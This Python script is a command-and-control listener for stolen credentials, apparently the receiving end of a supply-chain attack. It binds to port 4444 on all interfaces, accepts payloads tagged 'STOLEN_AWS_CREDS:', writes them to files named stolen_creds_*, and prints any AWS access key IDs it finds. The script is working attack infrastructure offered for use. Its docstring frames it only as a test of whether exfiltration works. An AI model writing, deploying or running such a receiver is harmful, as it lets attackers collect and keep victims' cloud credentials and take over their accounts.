#!/usr/bin/env python3
"""
Standalone C2 Credential Receiver (No PyPI)
Use this to test if credential exfiltration works
"""
import socket
import datetime
import sys

def main():
    """Start only the C2 credential receiver"""
    port = 4444
    
    print("=" * 60)
    print("  STANDALONE C2 CREDENTIAL RECEIVER")
    print("=" * 60)
    print()
    print(f"[*] Starting listener on port {port}...")
    
    # Create server socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Bind to all interfaces
    try:
        server.bind(("0.0.0.0", port))
        server.listen(5)
        print(f"[+] Successfully bound to 0.0.0.0:{port}")
    except Exception as e:
        print(f"[-] Failed to bind: {e}")
        sys.exit(1)
    
    # Show binding info
    sockname = server.getsockname()
    print(f"[+] Socket info: {sockname}")
    print(f"[+] Listening on ALL interfaces (0.0.0.0) port {port}")
    print()
    print("[*] Waiting for incoming credentials...")
    print("[*] Press Ctrl+C to stop")
    print()
    
    # Accept loop
    connection_count = 0
    while True:
        try:
            print(f"[DEBUG] Waiting for connection #{connection_count + 1}...")
            client, addr = server.accept()
            connection_count += 1
            
            print(f"\n{'=' * 60}")
            print(f"[+] CONNECTION #{connection_count} from {addr[0]}:{addr[1]}")
            print(f"{'=' * 60}")
            
            # Receive data
            data = client.recv(16384).decode('utf-8', errors='ignore')
            print(f"[+] Received {len(data)} bytes")
            
            if data:
                # Check if it's credential data
                if data.startswith("STOLEN_AWS_CREDS:"):
                    print("[+] This is AWS credential data!")
                    
                    # Save to file
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"stolen_creds_{timestamp}_{addr[0]}.txt"
                    
                    with open(filename, "w") as f:
                        f.write(f"Source: {addr[0]}:{addr[1]}\n")
                        f.write(f"Timestamp: {timestamp}\n")
                        f.write("=" * 60 + "\n")
                        f.write(data)
                    
                    print(f"[+] Saved to: {filename}")
                    
                    # Try to extract access key
                    if "aws_access_key_id" in data.lower():
                        print("[+] Contains AWS access keys!")
                        for line in data.split('\n'):
                            if 'aws_access_key_id' in line.lower():
                                print(f"[+] {line.strip()}")
                    
                    print("\n[SUCCESS] Credentials received and saved!")
                else:
                    print(f"[!] Received data but not credential format")
                    print(f"[!] First 100 chars: {data[:100]}")
            else:
                print("[-] No data received")
            
            client.close()
            print(f"[+] Connection closed\n")
            
        except KeyboardInterrupt:
            print("\n\n[*] Shutting down...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            import traceback
            traceback.print_exc()
    
    server.close()
    print("[*] Server stopped")

if __name__ == "__main__":
    main()
